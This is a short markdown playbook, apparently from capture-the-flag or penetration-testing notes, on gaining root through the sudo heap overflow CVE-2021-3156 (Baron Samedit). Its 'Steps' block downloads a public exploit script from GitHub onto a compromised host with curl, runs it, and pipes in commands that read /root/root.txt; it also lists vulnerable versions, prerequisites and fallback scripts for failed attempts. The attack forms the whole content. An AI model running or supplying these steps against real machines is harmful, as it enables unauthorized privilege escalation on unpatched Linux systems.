# Baron Samedit (CVE-2021-3156) — sudo heap overflow

## When this applies

- Linux target with sudo version 1.8.0–1.8.31p2 or 1.9.0–1.9.5p1 (typical on stock Ubuntu 18.04 / 20.04 / Debian 10 / CentOS 8).
- Goal: heap-overflow sudo to gain root non-interactively.

## Technique

When `sudo --version` returns a vulnerable version, Baron Samedit is the fast path to root. The most reliable public PoC for non-interactive use is **worawit's `exploit_nss.py`** — it overwrites the `nsswitch` `service_user` struct in glibc tcache, no kernel/glibc-version probing required.

**Pre-reqs:** glibc with tcache (default since 2.26), `nscd` not running, `gcc` on target.

## Steps

```bash
# From foothold shell (low-priv user with /tmp writable):
curl -sLO https://raw.githubusercontent.com/worawit/CVE-2021-3156/main/exploit_nss.py
python3 exploit_nss.py
# drops you into a root shell — but the shell is non-interactive when
# spawned over plain SSH without -t. Don't fight it; pipe commands in:
echo 'cat /root/root.txt; id; exit' | python3 exploit_nss.py
```

If `exploit_nss.py` fails: try `exploit_userspec.py` (same repo) which uses defaults_argv parsing instead — works when service_user struct is in a different tcache bin.

## Verifying success

- The piped script returns `uid=0(root)` from `id`.
- `/root/root.txt` contents are echoed back.

## Common pitfalls

- Non-interactive shell when piped over plain SSH — use `-t` or pipe commands directly.
- `nscd` running blocks the nss exploit — kill nscd or use `exploit_userspec.py`.
- glibc < 2.26 (no tcache) → use older PoCs targeting tcache-less heap layouts.

## Tools

- worawit's CVE-2021-3156 (`exploit_nss.py`, `exploit_userspec.py`)
- gcc (target-side compiler)
